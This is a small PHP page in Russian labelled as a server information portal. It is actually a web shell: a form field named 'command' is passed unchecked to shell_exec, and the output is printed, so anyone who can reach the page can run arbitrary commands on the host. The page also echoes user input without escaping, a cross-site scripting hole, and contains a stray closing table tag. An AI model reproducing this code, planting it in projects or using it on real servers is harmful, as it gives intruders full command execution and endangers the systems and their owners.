<html lang="en">
<head>
<title>Команды</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<h1>Информационный порталъ сервера</h1>

<form action="" method="post">
    <label for="command">Введите команду:</label><br>
    <input type="text" id="command" name="command" size="50"><br>
    <button type="submit">Выполнить</button>
</form>
<?php
// Проверяем, была ли форма отправлена
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    
    // Выполняем команду и выводим результат
    echo "<p>Результат выполнения команды: <strong>$command</strong></p>";
    echo "<pre>" . shell_exec($command) . "</pre>";
}
?>
</table>
</body>
</html>